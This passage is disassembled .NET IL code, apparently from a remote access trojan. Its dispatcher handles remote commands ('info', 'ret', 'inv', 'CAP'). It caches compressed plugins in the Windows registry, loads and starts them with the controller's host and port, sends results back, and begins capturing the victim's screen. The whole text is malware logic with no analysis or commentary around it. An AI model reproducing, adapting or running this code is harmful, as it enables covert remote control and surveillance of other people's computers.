        IL_02aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02af:  stloc.s    V_6
        IL_02b1:  ldarg.0
        IL_02b2:  ldstr      "hp"
        IL_02b7:  callvirt   instance void k.OK::DLV(string)
        IL_02bc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02c1:  leave.s    IL_02c3

      }  // end handler
      IL_02c3:  leave      IL_1242

      IL_02c8:  ldloc.s    V_55
      IL_02ca:  ldstr      "info"
      IL_02cf:  ldc.i4.0
      IL_02d0:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_02d5:  ldc.i4.0
      IL_02d6:  bne.un     IL_0468

      IL_02db:  ldarg.0
      IL_02dc:  ldloc.0
      IL_02dd:  ldc.i4.1
      IL_02de:  ldelem.ref
      IL_02df:  ldc.i4.0
      IL_02e0:  newarr     [mscorlib]System.Byte
      IL_02e5:  callvirt   instance object k.OK::GTV(string,
                                                     object)
      IL_02ea:  castclass  uint8[]
      IL_02ef:  stloc.1
      IL_02f0:  ldloc.0
      IL_02f1:  ldc.i4.2
      IL_02f2:  ldelem.ref
      IL_02f3:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_02f8:  ldc.i4.s   10
      IL_02fa:  clt
      IL_02fc:  ldloc.1
      IL_02fd:  ldlen
      IL_02fe:  conv.ovf.i4
      IL_02ff:  ldc.i4.0
      IL_0300:  ceq
      IL_0302:  and
      IL_0303:  brfalse.s  IL_034e

      IL_0305:  ldarg.0
      IL_0306:  ldc.i4.5
      IL_0307:  newarr     [mscorlib]System.String
      IL_030c:  stloc.s    V_60
      IL_030e:  ldloc.s    V_60
      IL_0310:  ldc.i4.0
      IL_0311:  ldstr      "pl"
      IL_0316:  stelem.ref
      IL_0317:  ldloc.s    V_60
      IL_0319:  ldc.i4.1
      IL_031a:  ldarg.0
      IL_031b:  ldfld      string k.OK::Y
      IL_0320:  stelem.ref
      IL_0321:  ldloc.s    V_60
      IL_0323:  ldc.i4.2
      IL_0324:  ldloc.0
      IL_0325:  ldc.i4.1
      IL_0326:  ldelem.ref
      IL_0327:  stelem.ref
      IL_0328:  ldloc.s    V_60
      IL_032a:  ldc.i4.3
      IL_032b:  ldarg.0
      IL_032c:  ldfld      string k.OK::Y
      IL_0331:  stelem.ref
      IL_0332:  ldloc.s    V_60
      IL_0334:  ldc.i4.4
      IL_0335:  ldc.i4.1
      IL_0336:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_033b:  stelem.ref
      IL_033c:  ldloc.s    V_60
      IL_033e:  call       string [mscorlib]System.String::Concat(string[])
      IL_0343:  callvirt   instance bool k.OK::Send(string)
      IL_0348:  pop
      IL_0349:  leave      IL_1242

      IL_034e:  ldloc.0
      IL_034f:  ldc.i4.2
      IL_0350:  ldelem.ref
      IL_0351:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0356:  ldc.i4.s   10
      IL_0358:  ble.s      IL_03a9

      IL_035a:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_035f:  stloc.s    V_8
      IL_0361:  ldloc.0
      IL_0362:  ldc.i4.0
      IL_0363:  ldelem.ref
      IL_0364:  ldarg.0
      IL_0365:  ldfld      string k.OK::Y
      IL_036a:  ldloc.0
      IL_036b:  ldc.i4.1
      IL_036c:  ldelem.ref
      IL_036d:  ldarg.0
      IL_036e:  ldfld      string k.OK::Y
      IL_0373:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0378:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_037d:  stloc.s    V_9
      IL_037f:  ldloc.s    V_8
      IL_0381:  ldarg.1
      IL_0382:  ldloc.s    V_9
      IL_0384:  ldarg.1
      IL_0385:  ldlen
      IL_0386:  conv.ovf.i4
      IL_0387:  ldloc.s    V_9
      IL_0389:  sub.ovf
      IL_038a:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_038f:  ldarg.0
      IL_0390:  ldloc.s    V_8
      IL_0392:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0397:  callvirt   instance uint8[] k.OK::ZIP(uint8[])
      IL_039c:  stloc.1
      IL_039d:  ldarg.0
      IL_039e:  ldloc.0
      IL_039f:  ldc.i4.1
      IL_03a0:  ldelem.ref
      IL_03a1:  ldloc.1
      IL_03a2:  ldc.i4.3
      IL_03a3:  callvirt   instance bool k.OK::STV(string,
                                                   object,
                                                   valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_03a8:  pop
      IL_03a9:  ldarg.0
      IL_03aa:  ldc.i4.5
      IL_03ab:  newarr     [mscorlib]System.String
      IL_03b0:  stloc.s    V_60
      IL_03b2:  ldloc.s    V_60
      IL_03b4:  ldc.i4.0
      IL_03b5:  ldstr      "pl"
      IL_03ba:  stelem.ref
      IL_03bb:  ldloc.s    V_60
      IL_03bd:  ldc.i4.1
      IL_03be:  ldarg.0
      IL_03bf:  ldfld      string k.OK::Y
      IL_03c4:  stelem.ref
      IL_03c5:  ldloc.s    V_60
      IL_03c7:  ldc.i4.2
      IL_03c8:  ldloc.0
      IL_03c9:  ldc.i4.1
      IL_03ca:  ldelem.ref
      IL_03cb:  stelem.ref
      IL_03cc:  ldloc.s    V_60
      IL_03ce:  ldc.i4.3
      IL_03cf:  ldarg.0
      IL_03d0:  ldfld      string k.OK::Y
      IL_03d5:  stelem.ref
      IL_03d6:  ldloc.s    V_60
      IL_03d8:  ldc.i4.4
      IL_03d9:  ldc.i4.0
      IL_03da:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_03df:  stelem.ref
      IL_03e0:  ldloc.s    V_60
      IL_03e2:  call       string [mscorlib]System.String::Concat(string[])
      IL_03e7:  callvirt   instance bool k.OK::Send(string)
      IL_03ec:  pop
      IL_03ed:  ldarg.0
      IL_03ee:  ldloc.1
      IL_03ef:  ldstr      "A"
      IL_03f4:  callvirt   instance object k.OK::Plugin(uint8[],
                                                        string)
      IL_03f9:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_03fe:  stloc.s    V_7
      IL_0400:  ldarg.0
      IL_0401:  ldc.i4.5
      IL_0402:  newarr     [mscorlib]System.String
      IL_0407:  stloc.s    V_60
      IL_0409:  ldloc.s    V_60
      IL_040b:  ldc.i4.0
      IL_040c:  ldstr      "info"
      IL_0411:  stelem.ref
      IL_0412:  ldloc.s    V_60
      IL_0414:  ldc.i4.1
      IL_0415:  ldarg.0
      IL_0416:  ldfld      string k.OK::Y
      IL_041b:  stelem.ref
      IL_041c:  ldloc.s    V_60
      IL_041e:  ldc.i4.2
      IL_041f:  ldloc.0
      IL_0420:  ldc.i4.1
      IL_0421:  ldelem.ref
      IL_0422:  stelem.ref
      IL_0423:  ldloc.s    V_60
      IL_0425:  ldc.i4.3
      IL_0426:  ldarg.0
      IL_0427:  ldfld      string k.OK::Y
      IL_042c:  stelem.ref
      IL_042d:  ldloc.s    V_60
      IL_042f:  ldc.i4.4
      IL_0430:  ldarg.0
      IL_0431:  ldloc.s    V_7
      IL_0433:  ldnull
      IL_0434:  ldstr      "GT"
      IL_0439:  ldc.i4.0
      IL_043a:  newarr     [mscorlib]System.Object
      IL_043f:  ldnull
      IL_0440:  ldnull
      IL_0441:  ldnull
      IL_0442:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0447:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_044c:  stloc.s    V_56
      IL_044e:  ldloca.s   V_56
      IL_0450:  callvirt   instance string k.OK::ENB(string&)
      IL_0455:  stelem.ref
      IL_0456:  ldloc.s    V_60
      IL_0458:  call       string [mscorlib]System.String::Concat(string[])
      IL_045d:  callvirt   instance bool k.OK::Send(string)
      IL_0462:  pop
      IL_0463:  leave      IL_1242

      IL_0468:  ldloc.s    V_55
      IL_046a:  ldstr      "ret"
      IL_046f:  ldc.i4.0
      IL_0470:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0475:  ldc.i4.0
      IL_0476:  bne.un     IL_0608

      IL_047b:  ldarg.0
      IL_047c:  ldloc.0
      IL_047d:  ldc.i4.1
      IL_047e:  ldelem.ref
      IL_047f:  ldc.i4.0
      IL_0480:  newarr     [mscorlib]System.Byte
      IL_0485:  callvirt   instance object k.OK::GTV(string,
                                                     object)
      IL_048a:  castclass  uint8[]
      IL_048f:  stloc.1
      IL_0490:  ldloc.0
      IL_0491:  ldc.i4.2
      IL_0492:  ldelem.ref
      IL_0493:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0498:  ldc.i4.s   10
      IL_049a:  clt
      IL_049c:  ldloc.1
      IL_049d:  ldlen
      IL_049e:  conv.ovf.i4
      IL_049f:  ldc.i4.0
      IL_04a0:  ceq
      IL_04a2:  and
      IL_04a3:  brfalse.s  IL_04ee

      IL_04a5:  ldarg.0
      IL_04a6:  ldc.i4.5
      IL_04a7:  newarr     [mscorlib]System.String
      IL_04ac:  stloc.s    V_60
      IL_04ae:  ldloc.s    V_60
      IL_04b0:  ldc.i4.0
      IL_04b1:  ldstr      "pl"
      IL_04b6:  stelem.ref
      IL_04b7:  ldloc.s    V_60
      IL_04b9:  ldc.i4.1
      IL_04ba:  ldarg.0
      IL_04bb:  ldfld      string k.OK::Y
      IL_04c0:  stelem.ref
      IL_04c1:  ldloc.s    V_60
      IL_04c3:  ldc.i4.2
      IL_04c4:  ldloc.0
      IL_04c5:  ldc.i4.1
      IL_04c6:  ldelem.ref
      IL_04c7:  stelem.ref
      IL_04c8:  ldloc.s    V_60
      IL_04ca:  ldc.i4.3
      IL_04cb:  ldarg.0
      IL_04cc:  ldfld      string k.OK::Y
      IL_04d1:  stelem.ref
      IL_04d2:  ldloc.s    V_60
      IL_04d4:  ldc.i4.4
      IL_04d5:  ldc.i4.1
      IL_04d6:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_04db:  stelem.ref
      IL_04dc:  ldloc.s    V_60
      IL_04de:  call       string [mscorlib]System.String::Concat(string[])
      IL_04e3:  callvirt   instance bool k.OK::Send(string)
      IL_04e8:  pop
      IL_04e9:  leave      IL_1242

      IL_04ee:  ldloc.0
      IL_04ef:  ldc.i4.2
      IL_04f0:  ldelem.ref
      IL_04f1:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_04f6:  ldc.i4.s   10
      IL_04f8:  ble.s      IL_0549

      IL_04fa:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_04ff:  stloc.s    V_11
      IL_0501:  ldloc.0
      IL_0502:  ldc.i4.0
      IL_0503:  ldelem.ref
      IL_0504:  ldarg.0
      IL_0505:  ldfld      string k.OK::Y
      IL_050a:  ldloc.0
      IL_050b:  ldc.i4.1
      IL_050c:  ldelem.ref
      IL_050d:  ldarg.0
      IL_050e:  ldfld      string k.OK::Y
      IL_0513:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0518:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_051d:  stloc.s    V_12
      IL_051f:  ldloc.s    V_11
      IL_0521:  ldarg.1
      IL_0522:  ldloc.s    V_12
      IL_0524:  ldarg.1
      IL_0525:  ldlen
      IL_0526:  conv.ovf.i4
      IL_0527:  ldloc.s    V_12
      IL_0529:  sub.ovf
      IL_052a:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_052f:  ldarg.0
      IL_0530:  ldloc.s    V_11
      IL_0532:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0537:  callvirt   instance uint8[] k.OK::ZIP(uint8[])
      IL_053c:  stloc.1
      IL_053d:  ldarg.0
      IL_053e:  ldloc.0
      IL_053f:  ldc.i4.1
      IL_0540:  ldelem.ref
      IL_0541:  ldloc.1
      IL_0542:  ldc.i4.3
      IL_0543:  callvirt   instance bool k.OK::STV(string,
                                                   object,
                                                   valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0548:  pop
      IL_0549:  ldarg.0
      IL_054a:  ldc.i4.5
      IL_054b:  newarr     [mscorlib]System.String
      IL_0550:  stloc.s    V_60
      IL_0552:  ldloc.s    V_60
      IL_0554:  ldc.i4.0
      IL_0555:  ldstr      "pl"
      IL_055a:  stelem.ref
      IL_055b:  ldloc.s    V_60
      IL_055d:  ldc.i4.1
      IL_055e:  ldarg.0
      IL_055f:  ldfld      string k.OK::Y
      IL_0564:  stelem.ref
      IL_0565:  ldloc.s    V_60
      IL_0567:  ldc.i4.2
      IL_0568:  ldloc.0
      IL_0569:  ldc.i4.1
      IL_056a:  ldelem.ref
      IL_056b:  stelem.ref
      IL_056c:  ldloc.s    V_60
      IL_056e:  ldc.i4.3
      IL_056f:  ldarg.0
      IL_0570:  ldfld      string k.OK::Y
      IL_0575:  stelem.ref
      IL_0576:  ldloc.s    V_60
      IL_0578:  ldc.i4.4
      IL_0579:  ldc.i4.0
      IL_057a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_057f:  stelem.ref
      IL_0580:  ldloc.s    V_60
      IL_0582:  call       string [mscorlib]System.String::Concat(string[])
      IL_0587:  callvirt   instance bool k.OK::Send(string)
      IL_058c:  pop
      IL_058d:  ldarg.0
      IL_058e:  ldloc.1
      IL_058f:  ldstr      "A"
      IL_0594:  callvirt   instance object k.OK::Plugin(uint8[],
                                                        string)
      IL_0599:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_059e:  stloc.s    V_10
      IL_05a0:  ldarg.0
      IL_05a1:  ldc.i4.5
      IL_05a2:  newarr     [mscorlib]System.String
      IL_05a7:  stloc.s    V_60
      IL_05a9:  ldloc.s    V_60
      IL_05ab:  ldc.i4.0
      IL_05ac:  ldstr      "ret"
      IL_05b1:  stelem.ref
      IL_05b2:  ldloc.s    V_60
      IL_05b4:  ldc.i4.1
      IL_05b5:  ldarg.0
      IL_05b6:  ldfld      string k.OK::Y
      IL_05bb:  stelem.ref
      IL_05bc:  ldloc.s    V_60
      IL_05be:  ldc.i4.2
      IL_05bf:  ldloc.0
      IL_05c0:  ldc.i4.1
      IL_05c1:  ldelem.ref
      IL_05c2:  stelem.ref
      IL_05c3:  ldloc.s    V_60
      IL_05c5:  ldc.i4.3
      IL_05c6:  ldarg.0
      IL_05c7:  ldfld      string k.OK::Y
      IL_05cc:  stelem.ref
      IL_05cd:  ldloc.s    V_60
      IL_05cf:  ldc.i4.4
      IL_05d0:  ldarg.0
      IL_05d1:  ldloc.s    V_10
      IL_05d3:  ldnull
      IL_05d4:  ldstr      "GT"
      IL_05d9:  ldc.i4.0
      IL_05da:  newarr     [mscorlib]System.Object
      IL_05df:  ldnull
      IL_05e0:  ldnull
      IL_05e1:  ldnull
      IL_05e2:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_05e7:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_05ec:  stloc.s    V_56
      IL_05ee:  ldloca.s   V_56
      IL_05f0:  callvirt   instance string k.OK::ENB(string&)
      IL_05f5:  stelem.ref
      IL_05f6:  ldloc.s    V_60
      IL_05f8:  call       string [mscorlib]System.String::Concat(string[])
      IL_05fd:  callvirt   instance bool k.OK::Send(string)
      IL_0602:  pop
      IL_0603:  leave      IL_1242

      IL_0608:  ldloc.s    V_55
      IL_060a:  ldstr      "inv"
      IL_060f:  ldc.i4.0
      IL_0610:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0615:  ldc.i4.0
      IL_0616:  bne.un     IL_0855

      IL_061b:  ldarg.0
      IL_061c:  ldloc.0
      IL_061d:  ldc.i4.1
      IL_061e:  ldelem.ref
      IL_061f:  ldc.i4.0
      IL_0620:  newarr     [mscorlib]System.Byte
      IL_0625:  callvirt   instance object k.OK::GTV(string,
                                                     object)
      IL_062a:  castclass  uint8[]
      IL_062f:  stloc.1
      IL_0630:  ldloc.0
      IL_0631:  ldc.i4.3
      IL_0632:  ldelem.ref
      IL_0633:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0638:  ldc.i4.s   10
      IL_063a:  clt
      IL_063c:  ldloc.1
      IL_063d:  ldlen
      IL_063e:  conv.ovf.i4
      IL_063f:  ldc.i4.0
      IL_0640:  ceq
      IL_0642:  and
      IL_0643:  brfalse.s  IL_068e

      IL_0645:  ldarg.0
      IL_0646:  ldc.i4.5
      IL_0647:  newarr     [mscorlib]System.String
      IL_064c:  stloc.s    V_60
      IL_064e:  ldloc.s    V_60
      IL_0650:  ldc.i4.0
      IL_0651:  ldstr      "pl"
      IL_0656:  stelem.ref
      IL_0657:  ldloc.s    V_60
      IL_0659:  ldc.i4.1
      IL_065a:  ldarg.0
      IL_065b:  ldfld      string k.OK::Y
      IL_0660:  stelem.ref
      IL_0661:  ldloc.s    V_60
      IL_0663:  ldc.i4.2
      IL_0664:  ldloc.0
      IL_0665:  ldc.i4.1
      IL_0666:  ldelem.ref
      IL_0667:  stelem.ref
      IL_0668:  ldloc.s    V_60
      IL_066a:  ldc.i4.3
      IL_066b:  ldarg.0
      IL_066c:  ldfld      string k.OK::Y
      IL_0671:  stelem.ref
      IL_0672:  ldloc.s    V_60
      IL_0674:  ldc.i4.4
      IL_0675:  ldc.i4.0
      IL_0676:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_067b:  stelem.ref
      IL_067c:  ldloc.s    V_60
      IL_067e:  call       string [mscorlib]System.String::Concat(string[])
      IL_0683:  callvirt   instance bool k.OK::Send(string)
      IL_0688:  pop
      IL_0689:  leave      IL_1242

      IL_068e:  ldloc.0
      IL_068f:  ldc.i4.3
      IL_0690:  ldelem.ref
      IL_0691:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0696:  ldc.i4.s   10
      IL_0698:  ble.s      IL_0714

      IL_069a:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_069f:  stloc.s    V_14
      IL_06a1:  ldc.i4.6
      IL_06a2:  newarr     [mscorlib]System.String
      IL_06a7:  stloc.s    V_60
      IL_06a9:  ldloc.s    V_60
      IL_06ab:  ldc.i4.0
      IL_06ac:  ldloc.0
      IL_06ad:  ldc.i4.0
      IL_06ae:  ldelem.ref
      IL_06af:  stelem.ref
      IL_06b0:  ldloc.s    V_60
      IL_06b2:  ldc.i4.1
      IL_06b3:  ldarg.0
      IL_06b4:  ldfld      string k.OK::Y
      IL_06b9:  stelem.ref
      IL_06ba:  ldloc.s    V_60
      IL_06bc:  ldc.i4.2
      IL_06bd:  ldloc.0
      IL_06be:  ldc.i4.1
      IL_06bf:  ldelem.ref
      IL_06c0:  stelem.ref
      IL_06c1:  ldloc.s    V_60
      IL_06c3:  ldc.i4.3
      IL_06c4:  ldarg.0
      IL_06c5:  ldfld      string k.OK::Y
      IL_06ca:  stelem.ref
      IL_06cb:  ldloc.s    V_60
      IL_06cd:  ldc.i4.4
      IL_06ce:  ldloc.0
      IL_06cf:  ldc.i4.2
      IL_06d0:  ldelem.ref
      IL_06d1:  stelem.ref
      IL_06d2:  ldloc.s    V_60
      IL_06d4:  ldc.i4.5
      IL_06d5:  ldarg.0
      IL_06d6:  ldfld      string k.OK::Y
      IL_06db:  stelem.ref
      IL_06dc:  ldloc.s    V_60
      IL_06de:  call       string [mscorlib]System.String::Concat(string[])
      IL_06e3:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_06e8:  stloc.s    V_15
      IL_06ea:  ldloc.s    V_14
      IL_06ec:  ldarg.1
      IL_06ed:  ldloc.s    V_15
      IL_06ef:  ldarg.1
      IL_06f0:  ldlen
      IL_06f1:  conv.ovf.i4
      IL_06f2:  ldloc.s    V_15
      IL_06f4:  sub.ovf
      IL_06f5:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_06fa:  ldarg.0
      IL_06fb:  ldloc.s    V_14
      IL_06fd:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0702:  callvirt   instance uint8[] k.OK::ZIP(uint8[])
      IL_0707:  stloc.1
      IL_0708:  ldarg.0
      IL_0709:  ldloc.0
      IL_070a:  ldc.i4.1
      IL_070b:  ldelem.ref
      IL_070c:  ldloc.1
      IL_070d:  ldc.i4.3
      IL_070e:  callvirt   instance bool k.OK::STV(string,
                                                   object,
                                                   valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0713:  pop
      IL_0714:  ldarg.0
      IL_0715:  ldc.i4.5
      IL_0716:  newarr     [mscorlib]System.String
      IL_071b:  stloc.s    V_60
      IL_071d:  ldloc.s    V_60
      IL_071f:  ldc.i4.0
      IL_0720:  ldstr      "pl"
      IL_0725:  stelem.ref
      IL_0726:  ldloc.s    V_60
      IL_0728:  ldc.i4.1
      IL_0729:  ldarg.0
      IL_072a:  ldfld      string k.OK::Y
      IL_072f:  stelem.ref
      IL_0730:  ldloc.s    V_60
      IL_0732:  ldc.i4.2
      IL_0733:  ldloc.0
      IL_0734:  ldc.i4.1
      IL_0735:  ldelem.ref
      IL_0736:  stelem.ref
      IL_0737:  ldloc.s    V_60
      IL_0739:  ldc.i4.3
      IL_073a:  ldarg.0
      IL_073b:  ldfld      string k.OK::Y
      IL_0740:  stelem.ref
      IL_0741:  ldloc.s    V_60
      IL_0743:  ldc.i4.4
      IL_0744:  ldc.i4.0
      IL_0745:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_074a:  stelem.ref
      IL_074b:  ldloc.s    V_60
      IL_074d:  call       string [mscorlib]System.String::Concat(string[])
      IL_0752:  callvirt   instance bool k.OK::Send(string)
      IL_0757:  pop
      IL_0758:  ldarg.0
      IL_0759:  ldloc.1
      IL_075a:  ldstr      "A"
      IL_075f:  callvirt   instance object k.OK::Plugin(uint8[],
                                                        string)
      IL_0764:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0769:  stloc.s    V_13
      IL_076b:  ldloc.s    V_13
      IL_076d:  ldnull
      IL_076e:  ldstr      "h"
      IL_0773:  ldc.i4.1
      IL_0774:  newarr     [mscorlib]System.Object
      IL_0779:  stloc.s    V_61
      IL_077b:  ldloc.s    V_61
      IL_077d:  ldc.i4.0
      IL_077e:  ldarg.0
      IL_077f:  ldfld      string k.OK::H
      IL_0784:  stelem.ref
      IL_0785:  ldloc.s    V_61
      IL_0787:  ldnull
      IL_0788:  ldnull
      IL_0789:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_078e:  ldloc.s    V_13
      IL_0790:  ldnull
      IL_0791:  ldstr      "p"
      IL_0796:  ldc.i4.1
      IL_0797:  newarr     [mscorlib]System.Object
      IL_079c:  stloc.s    V_61
      IL_079e:  ldloc.s    V_61
      IL_07a0:  ldc.i4.0
      IL_07a1:  ldarg.0
      IL_07a2:  ldfld      string k.OK::P
      IL_07a7:  stelem.ref
      IL_07a8:  ldloc.s    V_61
      IL_07aa:  ldnull
      IL_07ab:  ldnull
      IL_07ac:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_07b1:  ldloc.s    V_13
      IL_07b3:  ldnull
      IL_07b4:  ldstr      "osk"
      IL_07b9:  ldc.i4.1
      IL_07ba:  newarr     [mscorlib]System.Object
      IL_07bf:  stloc.s    V_61
      IL_07c1:  ldloc.s    V_61
      IL_07c3:  ldc.i4.0
      IL_07c4:  ldloc.0
      IL_07c5:  ldc.i4.2
      IL_07c6:  ldelem.ref
      IL_07c7:  stelem.ref
      IL_07c8:  ldloc.s    V_61
      IL_07ca:  ldnull
      IL_07cb:  ldnull
      IL_07cc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_07d1:  ldloc.s    V_13
      IL_07d3:  ldnull
      IL_07d4:  ldstr      "start"
      IL_07d9:  ldc.i4.0
      IL_07da:  newarr     [mscorlib]System.Object
      IL_07df:  ldnull
      IL_07e0:  ldnull
      IL_07e1:  ldnull
      IL_07e2:  ldc.i4.1
      IL_07e3:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_07e8:  pop
      IL_07e9:  br.s       IL_07f1

      IL_07eb:  ldc.i4.1
      IL_07ec:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_07f1:  ldarg.0
      IL_07f2:  ldfld      bool k.OK::Cn
      IL_07f7:  ldc.i4.0
      IL_07f8:  ceq
      IL_07fa:  box        [mscorlib]System.Boolean
      IL_07ff:  ldloc.s    V_13
      IL_0801:  ldnull
      IL_0802:  ldstr      "Off"
      IL_0807:  ldc.i4.0
      IL_0808:  newarr     [mscorlib]System.Object
      IL_080d:  ldnull
      IL_080e:  ldnull
      IL_080f:  ldnull
      IL_0810:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0815:  ldc.i4.1
      IL_0816:  box        [mscorlib]System.Boolean
      IL_081b:  ldc.i4.0
      IL_081c:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareObjectEqual(object,
                                                                                                                              object,
                                                                                                                              bool)
      IL_0821:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::OrObject(object,
                                                                                                                    object)
      IL_0826:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
      IL_082b:  brfalse.s  IL_07eb

      IL_082d:  ldloc.s    V_13
      IL_082f:  ldnull
      IL_0830:  ldstr      "off"
      IL_0835:  ldc.i4.1
      IL_0836:  newarr     [mscorlib]System.Object
      IL_083b:  stloc.s    V_61
      IL_083d:  ldloc.s    V_61
      IL_083f:  ldc.i4.0
      IL_0840:  ldc.i4.1
      IL_0841:  box        [mscorlib]System.Boolean
      IL_0846:  stelem.ref
      IL_0847:  ldloc.s    V_61
      IL_0849:  ldnull
      IL_084a:  ldnull
      IL_084b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0850:  leave      IL_1242

      IL_0855:  ldloc.s    V_55
      IL_0857:  ldstr      "CAP"
      IL_085c:  ldc.i4.0
      IL_085d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0862:  ldc.i4.0
      IL_0863:  bne.un     IL_09c6

      IL_0868:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_086d:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0872:  stloc.s    V_69
      IL_0874:  ldloca.s   V_69
      IL_0876:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_087b:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0880:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0885:  stloc.s    V_70
